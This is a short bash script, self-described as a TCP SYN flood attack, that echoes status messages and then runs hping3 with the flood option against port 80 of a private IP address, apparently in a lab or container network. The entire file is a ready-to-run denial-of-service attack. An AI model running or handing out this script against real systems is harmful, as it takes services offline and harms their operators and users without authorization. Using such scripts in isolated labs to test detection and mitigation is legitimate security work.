#!/bin/bash

# TCP SYN Flood Attack Script
TARGET="172.20.0.20"
PORT="80"

echo "Starting TCP SYN Flood attack on $TARGET:$PORT"
echo "This will send continuous SYN packets..."
echo "Press Ctrl+C to stop"

# Send SYN flood
hping3 -S -p $PORT --flood $TARGET
